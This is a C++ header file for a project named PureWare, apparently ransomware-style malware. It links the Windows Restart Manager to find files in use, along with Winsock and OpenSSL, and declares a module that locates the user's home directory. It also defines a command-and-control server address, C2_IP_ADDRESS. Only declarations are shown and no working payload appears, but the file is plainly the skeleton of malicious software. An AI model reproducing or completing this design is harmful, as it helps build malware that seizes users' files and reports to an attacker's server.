#ifndef PUREWARE_PUREWARE_HPP_
#define PUREWARE_PUREWARE_HPP_

#pragma once
#pragma comment(lib, "Rstrtmgr.lib") // Linking Restart Manager
#pragma comment(lib, "ws2_32.lib") // Linking Winsock
#pragma comment(lib, "libssl.lib") // Linking OpenSSL
#pragma comment(lib, "libcrypto.lib") // Linking SSL/TLS cryptography

#include <spdlog/spdlog.h>
#include <spdlog/sinks/basic_file_sink.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <Windows.h>
#include <restartmanager.h> // To check if files are in use by other processes
#include <winsock2.h> // For basic networking
#include <ws2tcpip.h> // For IP address translation
#include <openssl/ssl.h> // For SSL/TLS connections
#include <openssl/err.h> // For SSL/TLS error handling
#include <locale>
#include <shlobj.h> // For FileModule FOLDERID_*

class FileModule
{
public:
    void FindDirectory(); // Searches for the directory that we have rights to "C:\Users \{Username}\" and assign to the directory class variable
private:
    PWSTR directoryPath_; // The directory that the FindDirectory method will assign

};

#define C2_IP_ADDRESS "192.168.255.254"

#endif // PUREWARE_PUREWARE_HPP_